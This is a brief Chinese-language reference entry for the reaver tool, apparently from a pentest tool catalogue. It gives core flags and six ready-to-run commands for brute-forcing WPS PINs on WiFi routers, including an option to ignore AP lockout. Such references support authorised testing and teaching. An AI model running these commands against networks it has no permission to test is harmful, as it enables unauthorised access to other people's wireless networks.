# reaver

## 简介
WPS PIN 暴力破解工具

## 核心参数
- `-i`: 网卡接口
- `-b`: 目标 BSSID
- `-c`: 目标信道

## 命令示例
```bash
# 基本攻击
reaver -i wlan0mon -b 00:11:22:33:44:55 -c 6

# 详细输出
reaver -i wlan0mon -b 00:11:22:33:44:55 -c 6 -vv

# 指定延迟
reaver -i wlan0mon -b 00:11:22:33:44:55 -c 6 -d 2

# 使用已知 PIN
reaver -i wlan0mon -b 00:11:22:33:44:55 -c 6 -p 12345670

# 忽略锁定
reaver -i wlan0mon -b 00:11:22:33:44:55 -c 6 -L

# 保存会话
reaver -i wlan0mon -b 00:11:22:33:44:55 -c 6 -s session.wpc
```

## 使用场景
攻击启用 WPS 的 WiFi 路由器

## 所属分类
- [WiFi 攻击 (WiFi Attacks)](../categories/24-wifi-attacks.md)
